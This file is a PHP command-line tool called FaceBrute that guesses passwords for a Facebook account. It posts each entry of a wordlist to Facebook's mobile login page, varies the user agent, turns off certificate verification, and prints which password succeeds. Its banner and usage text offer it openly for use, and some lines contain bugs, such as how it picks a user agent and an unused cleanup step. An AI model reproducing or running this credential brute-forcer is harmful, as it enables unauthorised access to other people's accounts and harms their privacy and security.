<?php
error_reporting(0);
/*
  * FaceBrute
  * 16-05-2017 ( remake 28-04-2019 )
*/
function check($user, $pass) {
	$fileua = 'user-agents.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
	$kuki = 'kuki.txt';
	touch($kuki);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $kuki);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $kuki);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
	unlink("kuki.txt");
}

// code color
$def = "\e[1;39m";
$red = "\e[1;31m";
$green = "\e[1;32m";
$yellow = "\e[1;33m";
$blue = "\e[1;34m";

$banner = "{$red}
8888888888                        888888b.                    888
888                               888  \"88b                   888
888                               888  .88P                   888
8888888  8888b.   .d8888b .d88b.  8888888K.  888d888 888  888 888888 .d88b.
888         \"88b d88P\"   d8P  Y8b 888  \"Y88b 888P\"   888  888 888   d8P  Y8b
888     .d888888 888     88888888 888    888 888     888  888 888   88888888
888     888  888 Y88b.   Y8b.     888   d88P 888     Y88b 888 Y88b. Y8b.
888     \"Y888888  \"Y8888P \"Y8888  8888888P\"  888      \"Y88888  \"Y888 \"Y8888
{$blue}
			* USE AT YOUR OWN RISK *
{$def}";

print $banner;

$file = $_SERVER[argv][0];
$user = $_SERVER[argv][1];

$wordlist = $_SERVER[argv][2];
if(!empty($user) && !empty($wordlist)) {
	$passlist = file($wordlist);
	$passtotal = count($passlist);
	print "[+] Checking {$yellow}{$passtotal}${def} passwords..\n".$def;
	$i = 1;
	foreach($passlist as $password) {
		$pass = substr($password, 0, strlen($password) - 1);
		if(check(urlencode($user), urlencode($pass))) {
			print "[$i/$passtotal] {$pass} => {$green}Success{$def}\n";
			break;
		} else {
			print "[$i/$passtotal] {$pass} => {$red}Failed{$def}\n";
		}
		$i++;
	}
} else {
	print "
  Usage: php ".$file." [username] [wordlist-file]
  Example: php ".$file." myaccount worldlist.txt\n\n";
}
?>
